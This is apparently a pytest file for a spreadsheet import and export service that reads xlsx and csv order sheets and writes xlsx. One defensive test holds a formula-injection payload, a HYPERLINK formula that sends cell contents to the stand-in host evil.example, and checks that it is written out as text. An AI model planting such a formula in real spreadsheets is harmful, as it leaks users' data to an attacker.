"""services/sheet_io：xlsx / csv 读取（编码、空行、重复表头、日期单元格）与 xlsx 写出。"""

from __future__ import annotations

import io
import json
from datetime import date, datetime, timezone
from decimal import Decimal

import openpyxl
import pytest

from services import errors, sheet_io


def make_xlsx(sheets: dict[str, list[list]]) -> bytes:
    wb = openpyxl.Workbook()
    wb.remove(wb.active)
    for name, rows in sheets.items():
        ws = wb.create_sheet(name)
        for r in rows:
            ws.append(r)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


# ── xlsx 读取 ────────────────────────────────────────────────────────────────


def test_read_xlsx_header_detection_empty_rows_duplicates():
    data = make_xlsx({
        "订单": [
            [None, None, None],
            ["", "  ", None],
            ["平台订单号", "ASIN", "ASIN", None, "数量", "邮编"],
            ["PO-DEMO-1", "B0DEMO0001", "x", "孤列值", 1, "02134"],
            [None, None, None, None, None, None],
            ["  ", None],
            ["PO-DEMO-2", "B0DEMO0002", None, None, 2.0, 32960],
        ],
        "空表": [],
    })
    sheets = sheet_io.read_workbook(data, "orders.xlsx")
    assert [s.name for s in sheets] == ["订单", "空表"]
    s = sheets[0]
    assert s.headers == ["平台订单号", "ASIN", "ASIN (2)", "第 4 列", "数量", "邮编"]
    assert s.row_numbers == [4, 7]
    assert s.rows[0] == {"平台订单号": "PO-DEMO-1", "ASIN": "B0DEMO0001", "ASIN (2)": "x", "第 4 列": "孤列值",
                         "数量": 1, "邮编": "02134"}
    assert s.rows[1]["邮编"] == 32960 and s.rows[1]["数量"] == 2
    assert sheets[1].headers == [] and sheets[1].rows == []


def test_read_xlsx_dates_and_trailing_empty_columns():
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Sheet1"
    ws.append(["平台订单号", "下单时间", "建议采购日期"])
    ws.append(["PO-DEMO-1", datetime(2026, 10, 27, 21, 31), datetime(2026, 10, 31)])
    ws["C2"].number_format = "yyyy-mm-dd"
    ws["H1"] = None                     # 只有格式、没有内容的尾列
    ws["H1"].number_format = "@"
    buf = io.BytesIO()
    wb.save(buf)
    s = sheet_io.read_workbook(buf.getvalue(), "a.XLSX")[0]
    assert s.headers == ["平台订单号", "下单时间", "建议采购日期"]
    assert s.rows[0]["下单时间"] == datetime(2026, 10, 27, 21, 31)
    assert s.rows[0]["建议采购日期"] == datetime(2026, 10, 31)


def test_read_xlsx_formula_cached_value_and_header_whitespace():
    data = make_xlsx({"S": [[" 平台订单号 ", "数量\n(件)", 2026], ["PO-DEMO-1", 1, "x"]]})
    s = sheet_io.read_workbook(data, "f.xlsx")[0]
    assert s.headers == ["平台订单号", "数量 (件)", "2026"]


# ── csv 读取 ─────────────────────────────────────────────────────────────────


CSV_TEXT = "平台订单号,收货人姓名,邮编,数量\nPO-DEMO-1,Demo 甲,02134,1\n,,,\nPO-DEMO-2,Demo 乙,,2\n"


@pytest.mark.parametrize("encoding", ["utf-8", "utf-8-sig", "gbk", "gb18030"])
def test_read_csv_encodings(encoding):
    s = sheet_io.read_workbook(CSV_TEXT.encode(encoding), "导入.csv")[0]
    assert s.name == "导入"
    assert s.headers == ["平台订单号", "收货人姓名", "邮编", "数量"]
    assert s.rows == [{"平台订单号": "PO-DEMO-1", "收货人姓名": "Demo 甲", "邮编": "02134", "数量": "1"},
                      {"平台订单号": "PO-DEMO-2", "收货人姓名": "Demo 乙", "邮编": None, "数量": "2"}]
    assert s.row_numbers == [2, 4]


def test_read_csv_tab_and_semicolon_and_quotes():
    tab = "平台订单号\t收货人地址\nPO-DEMO-1\t\"100 Demo St, Apt 2\"\n"
    s = sheet_io.read_workbook(tab.encode(), "t.csv")[0]
    assert s.rows[0]["收货人地址"] == "100 Demo St, Apt 2"
    semi = "平台订单号;数量\nPO-DEMO-1;3\n"
    assert sheet_io.read_workbook(semi.encode(), "s.csv")[0].rows[0] == {"平台订单号": "PO-DEMO-1", "数量": "3"}


def test_read_csv_duplicate_headers_and_ragged_rows():
    text = "ASIN,ASIN,数量\nB0DEMO0001,B0DEMO0009,1,多出来的值\nB0DEMO0002\n"
    s = sheet_io.read_workbook(text.encode(), "d.csv")[0]
    assert s.headers == ["ASIN", "ASIN (2)", "数量", "第 4 列"]
    assert s.rows[1] == {"ASIN": "B0DEMO0002", "ASIN (2)": None, "数量": None, "第 4 列": None}


# ── 拒绝 ─────────────────────────────────────────────────────────────────────


def test_reject_xls_and_unknown_and_oversize_and_corrupt():
    with pytest.raises(errors.DomainError) as ei:
        sheet_io.read_workbook(b"\xd0\xcf\x11\xe0", "old.xls")
    assert ei.value.message == "请把 .xls 另存为 .xlsx 后再上传"
    with pytest.raises(errors.DomainError) as ei:
        sheet_io.read_workbook(b"abc", "notes.txt")
    assert ei.value.code == "VALIDATION"
    with pytest.raises(errors.DomainError) as ei:
        sheet_io.read_workbook(b"x" * (sheet_io.MAX_BYTES + 1), "big.csv")
    assert "10 MB" in ei.value.message
    with pytest.raises(errors.DomainError):
        sheet_io.read_workbook(b"", "empty.csv")
    with pytest.raises(errors.DomainError) as ei:
        sheet_io.read_workbook(b"PK\x03\x04 not really a zip", "broken.xlsx")
    assert ei.value.code == "VALIDATION"
    assert sheet_io.MAX_BYTES == 10 * 1024 * 1024


# ── 写出与往返 ───────────────────────────────────────────────────────────────


def test_write_xlsx_roundtrip_and_format():
    aware = datetime(2026, 10, 31, 6, 0, tzinfo=timezone.utc)          # 北京 14:00
    rows = [
        {"平台订单号": "PO-DEMO-1", "状态": "已采购", "总额": Decimal("44.49"), "建议采购日期": date(2026, 10, 31),
         "最近更新时间": aware, "备注": "=HYPERLINK(\"https://example.invalid\")", "细节": {"a": 1}},
        {"平台订单号": "PO-DEMO-2", "状态": None, "总额": None, "备注": "控制\x07字符"},
    ]
    headers = ["平台订单号", "状态", "总额", "建议采购日期", "最近更新时间", "备注", "细节"]
    data = sheet_io.write_xlsx([("结果:导出/2026", headers, rows), ("结果:导出/2026", ["A"], [["x"]])])

    wb = openpyxl.load_workbook(io.BytesIO(data))
    assert wb.sheetnames == ["结果_导出_2026", "结果_导出_2026 (2)"]
    ws = wb.worksheets[0]
    assert ws.freeze_panes == "A2"
    assert all(ws.cell(row=1, column=c).font.b for c in range(1, len(headers) + 1))
    assert ws.cell(row=2, column=6).data_type == "s"                  # 公式样文本按文本写
    assert ws.cell(row=2, column=6).value.startswith("=HYPERLINK")
    widths = {ws.cell(row=1, column=c).value: ws.column_dimensions[openpyxl.utils.get_column_letter(c)].width
              for c in range(1, len(headers) + 1)}
    assert 8 <= min(widths.values()) and max(widths.values()) <= 60
    assert widths["最近更新时间"] >= 19

    s = sheet_io.read_workbook(data, "out.xlsx")[0]
    assert s.headers == headers
    first = s.rows[0]
    assert first["总额"] == 44.49
    assert first["建议采购日期"] == datetime(2026, 10, 31)
    assert first["最近更新时间"] == datetime(2026, 10, 31, 14, 0)    # 北京时间写出
    assert json.loads(first["细节"]) == {"a": 1}
    assert s.rows[1]["备注"] == "控制字符" and s.rows[1]["状态"] is None


def test_write_xlsx_text_headers_and_empty_sheet():
    data = sheet_io.write_xlsx([("模板", ["平台订单号", "邮编"], [])], text_headers={"邮编"})
    wb = openpyxl.load_workbook(io.BytesIO(data))
    ws = wb["模板"]
    assert ws.column_dimensions["B"].number_format == "@"
    assert ws.max_row == 1
    s = sheet_io.read_workbook(data, "m.xlsx")[0]
    assert s.headers == ["平台订单号", "邮编"] and s.rows == []


def test_row_to_json():
    row = {"a": datetime(2026, 10, 27, 21, 31), "b": date(2026, 10, 31), "c": Decimal("1.50"), "d": 2, "e": None}
    out = sheet_io.row_to_json(row)
    assert out == {"a": "2026-10-27T21:31:00", "b": "2026-10-31", "c": "1.50", "d": 2, "e": None}
    json.dumps(out)


def test_row_cap(monkeypatch):
    monkeypatch.setattr(sheet_io, "MAX_ROWS", 3)
    ok_text = "平台订单号\nA\nB\n\n\nC\n"            # 空行不计入
    assert len(sheet_io.read_workbook(ok_text.encode(), "ok.csv")[0].rows) == 3
    with pytest.raises(errors.DomainError) as ei:
        sheet_io.read_workbook("平台订单号\nA\nB\nC\nD\n".encode(), "big.csv")
    assert "3 行" in ei.value.message
    data = make_xlsx({"S1": [["h"], ["a"], ["b"]], "S2": [["h"], ["c"], ["d"]]})   # 额度跨工作表累计
    with pytest.raises(errors.DomainError):
        sheet_io.read_workbook(data, "multi.xlsx")


def test_write_xlsx_never_writes_formulas_from_headers_or_values():
    """上传文件的表头 / 内容以「=」开头：写出的 xlsx（问题行、导出）里不得出现公式元素。"""
    import zipfile

    evil = '=HYPERLINK("http://evil.example/?"&A2,"click")'
    data = sheet_io.write_xlsx([("问题行", ["平台订单号", evil], [{"平台订单号": "=1+1", evil: "=SUM(A1:A2)"}])])
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        sheet = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
    assert "<f>" not in sheet and "<f " not in sheet
    wb = openpyxl.load_workbook(io.BytesIO(data))
    assert wb.active["B1"].value == evil and wb.active["A2"].value == "=1+1"


def test_wide_sparse_rows_are_refused_quickly():
    """15 KB 的文件、每行一格写在 XFD 列：不再把每行撑成 16384 列，而是直接拒绝。"""
    import time

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.append(["平台订单号", "ASIN"])
    for i in range(2, 2002):
        ws.cell(row=i, column=16384, value="x")
    buf = io.BytesIO()
    wb.save(buf)
    t0 = time.monotonic()
    with pytest.raises(errors.DomainError) as e:
        sheet_io.read_workbook(buf.getvalue(), "wide.xlsx")
    assert "列" in e.value.message and time.monotonic() - t0 < 2
    # 行尾的空单元格不算列数
    ok = make_xlsx({"S": [["平台订单号", "ASIN"] + [None] * 600, ["PO-DEMO-1", "B0DEMO0001"]]})
    assert sheet_io.read_workbook(ok, "ok.xlsx")[0].headers == ["平台订单号", "ASIN"]
    wide_csv = ("平台订单号" + ",x" * 600 + "\n").encode("utf-8")
    with pytest.raises(errors.DomainError):
        sheet_io.read_workbook(wide_csv, "wide.csv")
